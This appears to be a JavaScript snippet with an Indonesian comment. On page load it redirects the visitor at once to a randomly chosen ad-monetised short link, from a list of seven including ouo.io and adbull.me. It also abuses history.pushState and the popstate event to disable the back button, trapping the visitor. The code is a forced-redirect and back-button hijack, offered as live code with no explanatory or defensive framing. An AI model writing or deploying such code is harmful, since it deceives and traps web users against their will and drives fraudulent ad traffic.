// 1 ke 2//
var urls = ["https://besargaji.com/TAKR6K",
              "https://link.bicolink.net/khoA7K",
              "https://arahlink.id/zaW6d",
              "https://ouo.io/PVFwkB",
              "https://adbull.me/2q6qC1ub",
              "https://to.aoutoqw.xyz/WLQZDIxM",
              "https://go.aoutoqw.xyz/Bj0PKME"];

  function redirect() {
    var randomIndex = Math.floor(Math.random() * urls.length);
    window.location.replace(urls[randomIndex]);
  }

  if (typeof history.pushState === "function") {
    history.pushState("jibberish", null, null);
    window.addEventListener("popstate", function() {
      history.pushState('newjibberish', null, null);
    });
  }

  window.onload = function() {
    setTimeout(function() {
      redirect();
    }, 0000);
  };
